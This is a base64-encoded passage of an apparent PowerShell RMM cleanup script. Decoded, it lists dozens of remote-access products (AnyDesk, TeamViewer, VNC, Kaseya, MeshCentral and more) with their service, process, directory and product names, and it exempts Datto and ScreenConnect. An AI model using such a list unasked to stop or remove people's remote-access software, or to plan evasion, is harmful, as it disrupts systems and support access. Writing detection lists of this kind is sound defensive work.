b2xzIChtYXJrZXQgY292ZXJhZ2UgMjAyNikuCiAgICAjIEtFRVAgZm9yZXZlcjogRGF0dG8vQ2Vu
dHJhU3RhZ2UgKyBTY3JlZW5Db25uZWN0IGtlZXAgRlBzIChoYW5kbGVkIGFib3ZlKS4KICAgICMg
TkVWRVIgcHV0IERhdHRvL0NlbnRyYVN0YWdlL0NhZ1NlcnZpY2UgaW4gdGhpcyBsaXN0LgogICAg
ZnVuY3Rpb24gSXMtRGF0dG9LZWVwZXIoW3N0cmluZ10kcykgewogICAgICAgIGlmICgtbm90ICRz
KSB7IHJldHVybiAkZmFsc2UgfQogICAgICAgIHJldHVybiBbYm9vbF0oJHMgLW1hdGNoICcoP2kp
RGF0dG98Q2VudHJhU3RhZ2V8Q2FnU2VydmljZXxBdXRvdGFza0VuZHBvaW50JykKICAgIH0KICAg
ICRybW0gPSBAKAogICAgICAgIEB7IFRhZz0nQW55RGVzayc7ICAgICAgU3ZjPUAoJ0FueURlc2sn
KTsgUHJvYz1AKCdBbnlEZXNrJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQW55RGVzayIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBbnlEZXNrIiwiJGVudjpQcm9ncmFtRGF0YVxBbnlE
ZXNrIik7IFByb2Q9QCgnQW55RGVzayonKSB9CiAgICAgICAgQHsgVGFnPSdUZWFtVmlld2VyJzsg
ICBTdmM9QCgnVGVhbVZpZXdlcionKTsgUHJvYz1AKCdUZWFtVmlld2VyKicsJ3R2X3czMionLCd0
dl94NjQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVGVhbVZpZXdlciIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxUZWFtVmlld2VyIik7IFByb2Q9QCgnVGVhbVZpZXdlcionKSB9CiAg
ICAgICAgQHsgVGFnPSdTcGxhc2h0b3AnOyAgICBTdmM9QCgnU3BsYXNodG9wKicsJ1NSU2Vydmlj
ZScsJ1NTVVNlcnZpY2UnKTsgUHJvYz1AKCdTcGxhc2h0b3AqJywnc3Ryd2luY2x0KicsJ1NSTWFu
YWdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xTcGxhc2h0b3AiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cU3BsYXNodG9wIik7IFByb2Q9QCgnU3BsYXNodG9wKicpIH0KICAgICAg
ICBAeyBUYWc9J0xvZ01lSW4nOyAgICAgIFN2Yz1AKCdMb2dNZUluJywnTE1JR3VhcmRpYW5TdmMn
LCdMTUlpZ25pdGlvbicpOyBQcm9jPUAoJ0xvZ01lSW4qJywnTE1JR3VhcmRpYW4qJywnUmFTZXJ2
ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTG9nTWVJbiIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxMb2dNZUluIik7IFByb2Q9QCgnTG9nTWVJbionKSB9CiAgICAgICAgQHsgVGFn
PSdHb1RvJzsgICAgICAgICBTdmM9QCgnR29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdHb1RvUmVz
b2x2ZSonKTsgUHJvYz1AKCdHb1RvTXlQQyonLCdHb1RvQXNzaXN0KicsJ2cybSonLCdHb1RvUmVz
b2x2ZSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb1RvTXlQQyIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxHb1RvTXlQQyIpOyBQcm9kPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Npc3Qq
JywnR29UbyBSZXNvbHZlKicsJ0dvVG9NZWV0aW5nKicsJ0dvVG8gQ29ubmVjdConKSB9CiAgICAg
ICAgQHsgVGFnPSdSdXN0RGVzayc7ICAgICBTdmM9QCgnUnVzdERlc2snLCdydXN0ZGVzayonKTsg
UHJvYz1AKCdydXN0ZGVzayonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSdXN0RGVzayIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSdXN0RGVzayIpOyBQcm9kPUAoJ1J1c3REZXNrKicp
IH0KICAgICAgICBAeyBUYWc9J1N1cHJlbW8nOyAgICAgIFN2Yz1AKCdTdXByZW1vKicpOyBQcm9j
PUAoJ1N1cHJlbW8qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU3VwcmVtbyIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxTdXByZW1vIik7IFByb2Q9QCgnU3VwcmVtbyonKSB9CiAgICAg
ICAgQHsgVGFnPSdEV1NlcnZpY2UnOyAgICBTdmM9QCgnRFdBZ2VudCcsJ2R3YWdlbnQqJyk7IFBy
b2M9QCgnZHdhZ2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xEV0FnZW50IiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERXQWdlbnQiLCIkZW52OlByb2dyYW1EYXRhXERXQWdlbnQi
KTsgUHJvZD1AKCdEV0FnZW50KicsJ0RXU2VydmljZSonKSB9CiAgICAgICAgQHsgVGFnPSdab2hv
QXNzaXN0JzsgICBTdmM9QCgnWm9ob0Fzc2lzdConLCdab2hvTWVldGluZyonKTsgUHJvYz1AKCda
b2hvQXNzaXN0KicsJ1pvaG9VUlNCKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFpvaG9N
ZWV0aW5nIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFpvaG9NZWV0aW5nIik7IFByb2Q9QCgn
Wm9obyBBc3Npc3QqJywnWm9ob01lZXRpbmcqJykgfQogICAgICAgIEB7IFRhZz0nUmVtb3RlUEMn
OyAgICAgU3ZjPUAoJ1JlbW90ZVBDKicpOyBQcm9jPUAoJ1JlbW90ZVBDKicsJ1JQQ1N1aXRlKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlbW90ZVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XFJlbW90ZVBDIik7IFByb2Q9QCgnUmVtb3RlUEMqJykgfQogICAgICAgIEB7IFRhZz0n
Qm9tZ2FyJzsgICAgICAgU3ZjPUAoJ2JvbWdhcionLCdCZXlvbmRUcnVzdConKTsgUHJvYz1AKCdi
b21nYXIqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQm9tZ2FyIiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XEJvbWdhciIsIiRlbnY6UHJvZ3JhbUZpbGVzXEJleW9uZFRydXN0IiwiJHtl
bnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEJleW9uZFRydXN0Iik7IFByb2Q9QCgnQm9tZ2FyKicsJ0Jl
eW9uZFRydXN0KicpIH0KICAgICAgICBAeyBUYWc9J1BhcnNlYyc7ICAgICAgIFN2Yz1AKCdQYXJz
ZWMqJyk7IFByb2M9QCgncGFyc2VjZConLCdwc2VydmljZSonKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xQYXJzZWMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUGFyc2VjIiwiJGVudjpQ
cm9ncmFtRGF0YVxQYXJzZWMiKTsgUHJvZD1AKCdQYXJzZWMqJykgfQogICAgICAgIEB7IFRhZz0n
Q2hyb21lUkQnOyAgICAgU3ZjPUAoJ2Nocm9tb3RpbmcqJyk7IFByb2M9QCgncmVtb3RpbmdfaG9z
dConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb29nbGVcQ2hyb21lIFJlbW90ZSBEZXNr
dG9wIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdvb2dsZVxDaHJvbWUgUmVtb3RlIERlc2t0
b3AiKTsgUHJvZD1AKCdDaHJvbWUgUmVtb3RlIERlc2t0b3AqJykgfQogICAgICAgIEB7IFRhZz0n
VWx0cmFWTkMnOyAgICAgU3ZjPUAoJ3V2bmMqJywnd2ludm5jKicpOyBQcm9jPUAoJ3dpbnZuYyon
LCd1dm5jKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFVsdHJhVk5DIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XFVsdHJhVk5DIik7IFByb2Q9QCgnVWx0cmFWTkMqJywnV2luVk5DKicp
IH0KICAgICAgICBAeyBUYWc9J1RpZ2h0Vk5DJzsgICAgIFN2Yz1AKCd0dm5zZXJ2ZXIqJyk7IFBy
b2M9QCgndHZuc2VydmVyKicsJ3R2bnZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xUaWdodFZOQyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUaWdodFZOQyIpOyBQcm9kPUAo
J1RpZ2h0Vk5DKicpIH0KICAgICAgICBAeyBUYWc9J1JlYWxWTkMnOyAgICAgIFN2Yz1AKCd2bmNz
ZXJ2ZXIqJyk7IFByb2M9QCgndm5jc2VydmVyKicsJ3ZuY3ZpZXdlcionKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xSZWFsVk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlYWxWTkMi
KTsgUHJvZD1AKCdWTkMgU2VydmVyKicsJ1JlYWxWTkMqJykgfQogICAgICAgIEB7IFRhZz0nRGFt
ZVdhcmUnOyAgICAgU3ZjPUAoJ0RhbWVXYXJlKicpOyBQcm9jPUAoJ0RXUkNTKicsJ0RXUkNDKics
J0RhbWVXYXJlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNvbGFyV2luZHMiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cU29sYXJXaW5kcyIsIiRlbnY6UHJvZ3JhbUZpbGVzXERhbWVX
YXJlIFJlbW90ZSBTdXBwb3J0IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XERhbWVXYXJlIFJl
bW90ZSBTdXBwb3J0Iik7IFByb2Q9QCgnRGFtZVdhcmUqJykgfQogICAgICAgIEB7IFRhZz0nTmV0
U3VwcG9ydCc7ICAgU3ZjPUAoJ05ldFN1cHBvcnQqJyk7IFByb2M9QCgnY2xpZW50MzIqJywncGNp
Y3RsKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5ldFN1cHBvcnQiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cTmV0U3VwcG9ydCIpOyBQcm9kPUAoJ05ldFN1cHBvcnQqJykgfQogICAg
ICAgIEB7IFRhZz0nU2ltcGxlSGVscCc7ICAgU3ZjPUAoJ1NpbXBsZUhlbHAqJyk7IFByb2M9QCgn
U2ltcGxlU2VydmljZSonLCdzaW1wbGVzZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
bGVzXFNpbXBsZUhlbHAiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU2ltcGxlSGVscCIpOyBQ
cm9kPUAoJ1NpbXBsZUhlbHAqJykgfQogICAgICAgIEB7IFRhZz0nR2V0U2NyZWVuJzsgICAgU3Zj
PUAoJ0dldFNjcmVlbionKTsgUHJvYz1AKCdHZXRTY3JlZW4qJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcR2V0U2NyZWVuIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdldFNjcmVlbiIp
OyBQcm9kPUAoJ0dldFNjcmVlbionKSB9CiAgICAgICAgQHsgVGFnPSdJcGVyaXVzJzsgICAgICBT
dmM9QCgnSXBlcml1cyonKTsgUHJvYz1AKCdJcGVyaXVzUmVtb3RlKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXElwZXJpdXMgUmVtb3RlIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XElw
ZXJpdXMgUmVtb3RlIik7IFByb2Q9QCgnSXBlcml1cyonKSB9CiAgICAgICAgQHsgVGFnPSdJU0xP
bmxpbmUnOyAgIFN2Yz1AKCdJU0xsaWdodConKTsgUHJvYz1AKCdJU0xsaWdodConLCdJU0xBbHdh
eXNPbionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xJU0wgT25saW5lIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XElTTCBPbmxpbmUiKTsgUHJvZD1AKCdJU0wgTGlnaHQqJywnSVNMIEFs
d2F5c09uKicpIH0KICAgICAgICBAeyBUYWc9J0FtbXl5JzsgICAgICAgIFN2Yz1AKCdBbW15eSon
KTsgUHJvYz1AKCdBbW15eSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBbW15eSIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBbW15eSIpOyBQcm9kPUAoJ0FtbXl5KicpIH0KICAgICAg
ICBAeyBUYWc9J1VsdHJhVmlld2VyJzsgIFN2Yz1AKCdVbHRyYVZpZXdlcionKTsgUHJvYz1AKCdV
bHRyYVZpZXdlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xVbHRyYVZpZXdlciIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxVbHRyYVZpZXdlciIpOyBQcm9kPUAoJ1VsdHJhVmlld2Vy
KicpIH0KICAgICAgICBAeyBUYWc9J0Flcm9BZG1pbic7ICAgIFN2Yz1AKCdBZXJvQWRtaW4qJyk7
IFByb2M9QCgnQWVyb0FkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFlcm9BZG1p
biIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZXJvQWRtaW4iKTsgUHJvZD1AKCdBZXJvQWRt
aW4qJykgfQogICAgICAgIEB7IFRhZz0nTGl0ZU1hbmFnZXInOyAgU3ZjPUAoJ0xpdGVNYW5hZ2Vy
KicpOyBQcm9jPUAoJ1JPTVNlcnZlcionLCdST01WaWV3ZXIqJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcTGl0ZU1hbmFnZXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGl0ZU1hbmFn
ZXIiKTsgUHJvZD1AKCdMaXRlTWFuYWdlcionKSB9CiAgICAgICAgQHsgVGFnPSdSYWRtaW4nOyAg
ICAgICBTdmM9QCgnUmFkbWluKicpOyBQcm9jPUAoJ3JzZXJ2ZXIzKicsJ1JhZG1pbionKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xSYWRtaW4gU2VydmVyIDMiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cUmFkbWluIFNlcnZlciAzIik7IFByb2Q9QCgnUmFkbWluKicpIH0KICAgICAgICBA
eyBUYWc9J05vTWFjaGluZSc7ICAgIFN2Yz1AKCdueHNlcnZlcionLCdueGQqJyk7IFByb2M9QCgn
bnhkKicsJ254c2VydmVyKicsJ254cnVubmVyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XE5vTWFjaGluZSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOb01hY2hpbmUiKTsgUHJvZD1A
KCdOb01hY2hpbmUqJykgfQogICAgICAgIEB7IFRhZz0nTmluamFPbmUnOyAgICAgU3ZjPUAoJ05p
bmphUk1NQWdlbnQnLCduaW5qYXJtbSonLCdOaW5qYVJNTSonKTsgUHJvYz1AKCdOaW5qYVJNTUFn
ZW50KicsJ25pbmphcm1tKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphUk1NQWdl
bnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmluamFSTU1BZ2VudCIsIiRlbnY6UHJvZ3Jh
bURhdGFcTmluamFSTU1BZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE5pbmphT25lIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XE5pbmphT25lIik7IFByb2Q9QCgnTmluamFSTU0qJywnTmluamFP
bmUqJykgfQogICAgICAgIEB7IFRhZz0nQXRlcmEnOyAgICAgICAgU3ZjPUAoJ0F0ZXJhQWdlbnQn
KTsgUHJvYz1AKCdBdGVyYUFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFURVJB
IE5ldHdvcmtzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFURVJBIE5ldHdvcmtzIiwiJGVu
djpQcm9ncmFtRGF0YVxBVEVSQSBOZXR3b3JrcyIpOyBQcm9kPUAoJ0F0ZXJhKicpIH0KICAgICAg
ICBAeyBUYWc9J0Nvbm5lY3RXaXNlJzsgIFN2Yz1AKCdMVFNlcnZpY2UnLCdMVFN2Y01vbicpOyBQ
cm9jPUAoJ0xUU3ZjKicsJ0xUVHJheSonKTsgRGlycz1AKCIkZW52OndpbmRpclxMVFN2YyIsIiRl
bnY6UHJvZ3JhbUZpbGVzXExhYlRlY2ggQ2xpZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XExhYlRlY2ggQ2xpZW50Iik7IFByb2Q9QCgnQ29ubmVjdFdpc2UgQXV0b21hdGUqJywnQ29ubmVj
dFdpc2UgUk1NKicsJ0xhYlRlY2gqJykgfQogICAgICAgIEB7IFRhZz0nS2FzZXlhJzsgICAgICAg
U3ZjPUAoJ0FnZW50TW9uJywnS2FzZXlhKicsJ0tBQURTKicpOyBQcm9jPUAoJ0FnZW50TW9uKics
J0thc2V5YSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xLYXNleWEiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cS2FzZXlhIik7IFByb2Q9QCgnS2FzZXlhIFZTQSonLCdLYXNleWEgQWdl
bnQqJykgfQogICAgICAgIEB7IFRhZz0nTmFibGUnOyAgICAgICAgU3ZjPUAoJ0FkdmFuY2VkIE1v
bml0b3JpbmcgQWdlbnQqJywnTi1hYmxlKicsJ05DZW50cmFsKicpOyBQcm9jPUAoJ0ZpbGVTeXN0
ZW1BZ2VudConLCdOQ2VudHJhbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xBZHZhbmNl
ZCBNb25pdG9yaW5nIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFkdmFuY2VkIE1v
bml0b3JpbmcgQWdlbnQiLCIkZW52OlByb2dyYW1GaWxlc1xOLWFibGUgVGVjaG5vbG9naWVzIiwi
JHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE4tYWJsZSBUZWNobm9sb2dpZXMiLCIkZW52OlByb2dy
YW1GaWxlc1xNU1BBIEZpbGVzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XE1TUEEgRmlsZXMi
KTsgUHJvZD1AKCdBZHZhbmNlZCBNb25pdG9yaW5nIEFnZW50KicsJ04tYWJsZSonLCdOLWNlbnRy
YWwqJywnTi1zaWdodConLCdUYWtlIENvbnRyb2wqJywnU29sYXJXaW5kcyBNU1AqJykgfQogICAg
ICAgIEB7IFRhZz0nU3luY3JvJzsgICAgICAgU3ZjPUAoJ1N5bmNybyonLCdLYWJ1dG8qJyk7IFBy
b2M9QCgnU3luY3JvKicsJ0thYnV0byonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xSZXBh
aXJUZWNoIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJlcGFpclRlY2giLCIkZW52OlByb2dy
YW1GaWxlc1xTeW5jcm8iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU3luY3JvIiwiJGVudjpQ
cm9ncmFtRGF0YVxTeW5jcm8iKTsgUHJvZD1AKCdTeW5jcm8qJywnS2FidXRvKicsJ1JlcGFpclRl
Y2gqJykgfQogICAgICAgIEB7IFRhZz0nUHVsc2V3YXknOyAgICAgU3ZjPUAoJ1B1bHNld2F5Kics
J1BDIE1vbml0b3IqJyk7IFByb2M9QCgnUENNb25pdG9yTWdyKicsJ1BDTW9uaXRvck1hbmFnZXIq
JywnUHVsc2V3YXkqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUHVsc2V3YXkiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cUHVsc2V3YXkiLCIkZW52OlByb2dyYW1GaWxlc1xQQyBNb25p
dG9yIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBDIE1vbml0b3IiKTsgUHJvZD1AKCdQdWxz
ZXdheSonLCdQQyBNb25pdG9yKicpIH0KICAgICAgICBAeyBUYWc9J1N1cGVyT3BzJzsgICAgIFN2
Yz1AKCdTdXBlck9wcyonKTsgUHJvYz1AKCdTdXBlck9wcyonKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xTdXBlck9wcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTdXBlck9wcyIsIiRl
bnY6UHJvZ3JhbURhdGFcU3VwZXJPcHMiKTsgUHJvZD1AKCdTdXBlck9wcyonKSB9CiAgICAgICAg
QHsgVGFnPSdMZXZlbCc7ICAgICAgICBTdmM9QCgnTGV2ZWwqJyk7IFByb2M9QCgnbGV2ZWwqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTGV2ZWwiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cTGV2ZWwiLCIkZW52OlByb2dyYW1EYXRhXExldmVsIik7IFByb2Q9QCgnTGV2ZWwqJykgfQog
ICAgICAgIEB7IFRhZz0nQWN0aW9uMSc7ICAgICAgU3ZjPUAoJ0FjdGlvbjEqJyk7IFByb2M9QCgn
QWN0aW9uMSonLCdhY3Rpb24xX2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFj
dGlvbjEiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWN0aW9uMSIsIiRlbnY6UHJvZ3JhbURh
dGFcQWN0aW9uMSIpOyBQcm9kPUAoJ0FjdGlvbjEqJykgfQogICAgICAgIEB7IFRhZz0nTWFuYWdl
RW5naW5lJzsgU3ZjPUAoJ01hbmFnZUVuZ2luZSonLCdVRU1TKicsJ0RDQWdlbnQqJyk7IFByb2M9
QCgnTWFuYWdlRW5naW5lKicsJ2RjYWdlbnQqJywnVUVNUyonKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xNYW5hZ2VFbmdpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTWFuYWdlRW5n
aW5lIik7IFByb2Q9QCgnTWFuYWdlRW5naW5lKicsJ1VFTVMqJywnRGVza3RvcCBDZW50cmFsKics
J0VuZHBvaW50IENlbnRyYWwqJywnUk1NIENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nVGFj
dGljYWxSTU0nOyAgU3ZjPUAoJ3RhY3RpY2Fscm1tKicsJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQn
KTsgUHJvYz1AKCd0YWN0aWNhbHJtbSonLCdtZXNoYWdlbnQqJywnTWVzaEFnZW50KicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRhY3RpY2FsQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cVGFjdGljYWxBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE1lc2ggQWdlbnQiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cTWVzaCBBZ2VudCIpOyBQcm9kPUAoJ1RhY3RpY2FsKicsJ01l
c2ggQWdlbnQqJywnTWVzaENlbnRyYWwqJykgfQogICAgICAgIEB7IFRhZz0nTWVzaENlbnRyYWwn
OyAgU3ZjPUAoJ01lc2ggQWdlbnQnLCdNZXNoQWdlbnQnLCdNZXNoQ2VudHJhbConKTsgUHJvYz1A
KCdNZXNoQWdlbnQqJywnTWVzaENlbnRyYWwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
TWVzaCBBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNZXNoIEFnZW50Iik7IFByb2Q9
QCgnTWVzaCpBZ2VudConLCdNZXNoQ2VudHJhbConKSB9CiAgICAgICAgQHsgVGFnPSdDb250aW51
dW0nOyAgICBTdmM9QCgnU0FBWionLCdDb250aW51dW0qJyk7IFByb2M9QCgnU0FBWionLCdDb250
aW51dW0qJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU0FBWk9EIiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XFNBQVpPRCIsIiRlbnY6UHJvZ3JhbUZpbGVzXENvbnRpbnV1bSIsIiR7ZW52
OlByb2dyYW1GaWxlcyh4ODYpfVxDb250aW51dW0iKTsgUHJvZD1AKCdDb250aW51dW0qJywnU0FB
WionKSB9CiAgICAgICAgQHsgVGFnPSdOYXZlcmlzayc7ICAgICBTdmM9QCgnTmF2ZXJpc2sqJyk7
IFByb2M9QCgnTmF2ZXJpc2sqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmF2ZXJpc2si
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmF2ZXJpc2siKTsgUHJvZD1AKCdOYXZlcmlzayon
KSB9CiAgICAgICAgQHsgVGFnPSdJbW15Qm90JzsgICAgICBTdmM9QCgnSW1teUJvdConLCdJbW15
KicpOyBQcm9jPUAoJ0ltbXlBZ2VudConLCdJbW15Qm90KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
bUZpbGVzXEltbXlCb3QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSW1teUJvdCIsIiRlbnY6
UHJvZ3JhbURhdGFcSW1teUJvdCIpOyBQcm9kPUAoJ0ltbXlCb3QqJykgfQogICAgICAgIEB7IFRh
Zz0nQXV0b21veCc7ICAgICAgU3ZjPUAoJ2FtYWdlbnQqJywnQXV0b21veConKTsgUHJvYz1AKCdh
bWFnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1dG9tb3giLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cQXV0b21veCIsIiRlbnY6UHJvZ3JhbURhdGFcYW1hZ2VudCIpOyBQcm9k
PUAoJ0F1dG9tb3gqJykgfQogICAgICAgIEB7IFRhZz0nQWNyb25pc0N5YmVyJzsgU3ZjPUAoJ0Fj
cm9uaXMqJyk7IFByb2M9QCgnYWNyb2NtZConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xB
Y3JvbmlzIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFjcm9uaXMiKTsgUHJvZD1AKCdBY3Jv
bmlzIEN5YmVyKicsJ0Fjcm9uaXMgQWdlbnQqJywnQ3liZXIgUHJvdGVjdCBBZ2VudConKSB9CiAg
ICAgICAgQHsgVGFnPSdEb21vdHonOyAgICAgICBTdmM9QCgnRG9tb3R6KicpOyBQcm9jPUAoJ0Rv
bW90eionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xEb21vdHoiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cRG9tb3R6Iik7IFByb2Q9QCgnRG9tb3R6KicpIH0KICAgICAgICBAeyBUYWc9
J0F1dmlrJzsgICAgICAgIFN2Yz1AKCdBdXZpayonKTsgUHJvYz1AKCdBdXZpayonKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xBdXZpayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBdXZp
ayIpOyBQcm9kPUAoJ0F1dmlrKicpIH0KICAgICAgICBAeyBUYWc9J0JhcnJhY3VkYVJNTSc7IFN2
Yz1AKCdCYXJyYWN1ZGEqJyk7IFByb2M9QCgnTVdTZXJ2aWNlKicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXEJhcnJhY3VkYSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxCYXJyYWN1ZGEi
LCIkZW52OlByb2dyYW1GaWxlc1xMZXZlbCBQbGF0Zm9ybXMiLCIke2VudjpQcm9ncmFtRmlsZXMo
eDg2KX1cTGV2ZWwgUGxhdGZvcm1zIik7IFByb2Q9QCgnQmFycmFjdWRhIFJNTSonLCdNYW5hZ2Vk
IFdvcmtwbGFjZSonKSB9CiAgICAgICAgQHsgVGFnPSdHb3Zlcmxhbic7ICAgICBTdmM9QCgnR292
ZXJsYW4qJyk7IFByb2M9QCgnZ292ZXJsYW4qJywnZ292YWdlbnQqJyk7IERpcnM9QCgiJGVudjpQ
cm9ncmFtRmlsZXNcR292ZXJsYW4iLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR292ZXJsYW4i
KTsgUHJvZD1AKCdHb3ZlcmxhbionKSB9CiAgICAgICAgQHsgVGFnPSdQRFEnOyAgICAgICAgICBT
dmM9QCgnUERRKicpOyBQcm9jPUAoJ1BEUVJ1bm5lcionLCdQRFFJbnZlbnRvcnkqJywnUERRRGVw
bG95KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFkbWluIEFyc2VuYWwiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cQWRtaW4gQXJzZW5hbCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFBEUSIs
